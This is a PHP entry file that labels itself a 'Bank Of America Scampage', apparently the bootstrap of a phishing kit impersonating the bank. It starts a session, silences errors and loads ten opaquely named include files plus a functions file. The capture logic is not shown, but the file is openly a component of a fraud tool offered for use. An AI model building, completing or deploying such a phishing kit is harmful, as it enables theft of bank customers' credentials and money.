<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             26/10/2019
 * @package           Bank Of America Scampage
 *
 * Project Name:      Bank Of America Scampage
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
session_start();
error_reporting(0);
include_once 'zz1.php';
include_once 'zz2.php';
include_once 'zz3.php';
include_once 'zz4.php';
include_once 'zz5.php';
include_once 'zz6.php';
include_once 'zz7.php';
include_once 'zz8.php';
include_once 'zz9.php';
include_once 'zz10.php';
include_once 'functions.php';
?>